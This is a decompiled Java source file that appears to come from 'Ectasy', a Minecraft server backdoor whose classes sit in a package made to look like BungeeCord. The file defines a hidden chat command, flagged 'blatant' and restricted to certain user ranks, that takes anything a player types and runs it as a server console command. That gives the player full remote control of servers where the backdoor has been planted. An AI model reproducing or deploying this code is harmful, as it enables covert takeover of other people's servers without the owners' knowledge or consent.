package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "console",
   description = "Execute a console command",
   blatant = true,
   rank = Rank.LITE,
   aliases = {"exec", "execute"}
)
public class ConsoleCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use console <cmd>");
      } else {
         Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
            String join = String.join(" ", var3);
            ChatUtil.sendChat(var1.getPlayer(), "Executing the command &f" + join);
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), join);
         });
      }
   }
}
